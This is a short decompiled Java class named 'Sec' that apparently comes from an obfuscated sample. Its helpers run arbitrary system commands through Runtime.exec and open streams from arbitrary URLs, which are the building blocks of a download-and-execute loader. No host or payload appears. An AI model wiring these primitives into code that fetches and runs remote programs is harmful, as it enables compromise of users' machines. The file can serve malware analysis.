import java.net.URL;
import java.io.InputStream;

// 
// Decompiled by Procyon v0.5.30
// 

public class Sec
{
    public static boolean z;
    
    public static Runtime getRT() {
        return Runtime.getRuntime();
    }
    
    public static void exe(final String a) throws Exception {
        getRT().exec(a);
    }
    
    public static InputStream createIS(final String a) throws Exception {
        final int z = Final.z;
        final InputStream openStream = new URL(a).openStream();
        if (z != 0) {
            Sec.z = !Sec.z;
        }
        return openStream;
    }
}
